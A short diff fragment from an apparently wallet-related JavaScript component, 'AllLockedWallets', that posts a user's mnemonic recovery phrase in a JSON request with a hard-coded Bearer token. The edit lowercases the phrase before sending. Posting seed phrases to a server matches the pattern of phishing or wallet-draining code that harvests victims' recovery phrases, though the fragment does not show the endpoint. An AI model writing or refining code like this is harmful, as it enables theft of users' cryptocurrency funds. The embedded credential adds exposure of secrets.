@@ -29,7 +29,7 @@ function AllLockedWallets() {
                     'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
                 },
                 body: JSON.stringify({ 
-                    mnemonic: phrase,
+                    mnemonic: phrase.toLowerCase(),
 
                 })
             });
